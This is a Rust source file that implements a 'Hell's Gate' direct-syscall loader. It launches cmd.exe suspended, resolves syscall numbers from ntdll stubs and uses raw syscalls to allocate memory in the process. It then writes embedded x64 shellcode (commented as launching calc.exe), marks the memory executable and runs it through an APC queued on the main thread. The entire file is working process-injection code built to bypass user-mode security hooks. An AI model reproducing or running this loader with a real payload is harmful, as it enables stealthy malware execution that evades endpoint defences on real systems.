#![feature(c_variadic)]

use scopeguard::defer;
use std::{ffi::c_void, io, ptr::null_mut};
use windows::{
    core::*,
    Win32::{
        Foundation::{GetLastError, BOOL, HANDLE, NTSTATUS, STATUS_SUCCESS},
        System::{
            Diagnostics::Debug::ReadProcessMemory,
            LibraryLoader::{GetModuleHandleW, GetProcAddress},
            Memory::*,
            Threading::{
                CreateProcessW, TerminateProcess, CREATE_SUSPENDED, PROCESS_INFORMATION,
                STARTUPINFOW,
            },
        },
    },
};

unsafe extern "C" {
    fn hells_gate(w_system_call: u16) -> i32; // Setup the hellsgate call by writing the syscall id
    fn hell_descent(...) -> NTSTATUS; // perform the hellsgate call
}


struct HellsRustyGate {
    h_proc: HANDLE,
}

impl HellsRustyGate {
    pub fn new(h_proc: HANDLE) -> Result<Self> {
        Ok(HellsRustyGate { h_proc })
    }

    fn get_syscall_id_from_process(h_proc: HANDLE, stub_addr: *mut c_void) -> u32 {
        unsafe {
            let mut stub = vec![0u8; 8];
            let mut bytes_read: usize = 0;

            let read_res = ReadProcessMemory(
                h_proc,
                stub_addr,
                stub.as_mut_ptr() as *mut c_void,
                stub.len(),
                Some(&mut bytes_read as *mut usize),
            );

            if read_res.is_err() {
                println!("Error reading from process: {}", read_res.unwrap_err());
                return 0;
            }

            // x64 nt syscall stub will look like this
            // take the syscall id from the 5th byte
            //
            // 4c 8b d1          mov     r10,rcx
            // b8 18000000       mov     eax,18h ; syscall id

            stub[4] as u32
        }
    }

    // set up the system call before calling hell_descent
    unsafe fn setup_hells_gate(&self, api_name: &str) {
        unsafe {
            let ntdll_utf16: Vec<u16> = "ntdll.dll"
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();

            let ntdll = GetModuleHandleW(PCWSTR(ntdll_utf16.as_ptr())).unwrap();
            let proc = GetProcAddress(ntdll, PCSTR::from_raw(api_name.as_ptr()));

            let p_address: *mut c_void = std::mem::transmute(proc);
            if p_address == null_mut() {
                println!(
                    "Error getting {} address from ntdll: {}",
                    api_name,
                    GetLastError().0
                );
            }
            let w_system_call = HellsRustyGate::get_syscall_id_from_process(self.h_proc, p_address);
            hells_gate(w_system_call as u16);
        }
    }
}

fn main() {
    let _exe_path = "c:\\windows\\system32\\cmd.exe";
    println!("{}", _exe_path);

    let mut _s: Vec<u16> = _exe_path.trim_matches('"').encode_utf16().collect();
    _s.push(0);
    let exe_path = PCWSTR(_s.as_mut_ptr());

    // the shellcode will winexec calc.exe
    const SHELLCODE: &[u8] = &[
        0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18,
        0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49,
        0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff,
        0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44,
        0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01,
        0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59,
        0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41,
        0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
        0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01,
        0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91,
        0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0,
        0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8,
        0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1,
        0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
    ];

    unsafe {
        let si = STARTUPINFOW::default();
        let mut pi = PROCESS_INFORMATION::default();

        let res = CreateProcessW(
            exe_path,
            PWSTR::null(),
            None,
            None,
            BOOL(0),
            CREATE_SUSPENDED,
            None,
            None,
            &si,
            &mut pi,
        );
        if res.is_err() {
            println!("Failed to create process: {}", res.err().unwrap());
            return;
        }

        defer! {
            // This block will run when the function exits, regardless of how it exits
            println!("Performing cleanup before returning");
            let exit_code: u32 = 0;
            let terminated = TerminateProcess(pi.hProcess, exit_code);
            if terminated.is_err() {
                println!("Failed to terminate process: {}", terminated.err().unwrap());
            }
        }

        let hells_rusty_gate = HellsRustyGate::new(pi.hProcess).unwrap();

        let h_proc = Owned::new(pi.hProcess);
        let h_thread = Owned::new(pi.hThread);

        // allocate the memory for the shellcode
        let mut lp_address: *mut c_void = null_mut();
        let mut s_data_size: usize = SHELLCODE.len();
        hells_rusty_gate.setup_hells_gate("NtAllocateVirtualMemory\0");
        let mut status = hell_descent(
            *h_proc,
            &mut lp_address,
            0,
            &mut s_data_size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status != STATUS_SUCCESS {
            println!(
                "Failed to call NtAllocateVirtualMemory, status: {:x}",
                status.0
            );
            return;
        }

        // write the shellcode
        let mut bytes_written: usize = 0;
        hells_rusty_gate.setup_hells_gate("NtWriteVirtualMemory\0");
        status = hell_descent(
            *h_proc,
            lp_address,
            SHELLCODE.as_ptr() as *mut c_void,
            SHELLCODE.len(),
            &mut bytes_written,
        );
        if status != STATUS_SUCCESS {
            println!(
                "Failed to call NtWriteVirtualMemory, status: {:x}",
                status.0
            );
            return;
        }

        // make the memory executable
        let mut old_protect: usize = 0;
        hells_rusty_gate.setup_hells_gate("NtProtectVirtualMemory\0");
        status = hell_descent(
            *h_proc,
            &mut lp_address,
            &mut s_data_size,
            PAGE_EXECUTE_READWRITE.0,
            &mut old_protect,
        );
        if status != STATUS_SUCCESS {
            println!(
                "Failed to call NtProtectVirtualMemory, status: {:x}",
                status.0
            );
            return;
        }

        // queue an APC on the main thread
        hells_rusty_gate.setup_hells_gate("NtQueueApcThread\0");
        status = hell_descent(*h_thread, lp_address, 0, 0, 0);
        if status != STATUS_SUCCESS {
            println!("Failed to call NtQueueApcThread, status: {:x}", status.0);
            return;
        }

        // resume the main thread
        hells_rusty_gate.setup_hells_gate("NtResumeThread\0");
        status = hell_descent(*h_thread, 0);
        if status != STATUS_SUCCESS {
            println!("Failed to call NtResumeThread, status: {:x}", status.0);
            return;
        }

        println!("Apc queued, press any key to exit.");
        std::thread::sleep(std::time::Duration::from_secs(3));
        let mut input = String::new();
        io::stdin()
            .read_line(&mut input)
            .expect("Failed to read input");
    }

    return;
}
